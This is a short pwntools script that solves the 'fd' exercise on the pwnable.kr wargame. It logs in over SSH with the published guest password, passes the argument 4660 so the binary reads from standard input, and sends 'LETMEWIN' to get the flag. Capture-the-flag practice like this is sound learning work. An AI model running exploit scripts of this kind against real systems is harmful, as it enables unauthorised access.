from pwn import *

shell = ssh('fd' ,'pwnable.kr' ,password='guest', port=2222)

process = shell.process(executable='./fd', argv=['fd','4660'])
process.sendline('LETMEWIN')
print process.recv()

process.close()
shell.close()